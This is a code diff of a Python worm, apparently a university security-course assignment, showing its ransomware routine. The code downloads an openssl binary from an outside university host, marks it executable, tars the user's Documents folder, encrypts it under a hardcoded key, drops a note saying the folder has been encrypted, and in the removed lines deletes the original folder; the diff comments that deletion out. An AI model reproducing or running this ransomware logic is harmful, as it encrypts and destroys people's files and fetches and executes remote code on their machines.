@@ -63,20 +63,21 @@ def leaveNote():
 	file = open("note.txt", 'w')
 	file.write("Hey! your Documents folder has been encrypted.")
 	file.close()
+	os.chdir("/tmp")
 
 
 #################################################################
 # Download the encryption program
 #################################################################
-def downloadAndEncrsssypt(path):
+def downloadAndEncrypt(path):
 	urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl","openssl")
 	# create a tar
 	createTar(path)
 	# encrypt that tar
 	call(["chmod", "a+x", "./openssl"])
-	call(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", "Document.tar", "-out", "Document.tar.enc", "-k", "cs456worm"])
+	call(["openssl", "aes-256-cbc", "-a", "-salt", "-in", "Document.tar", "-out", "Document.tar.enc", "-k", "cs456worm"])
 	# delete the original directory
-	shutil.rmtree(path+'/Documents/')
+	#shutil.rmtree(path+'/Documents/')
 	leaveNote()
 
 
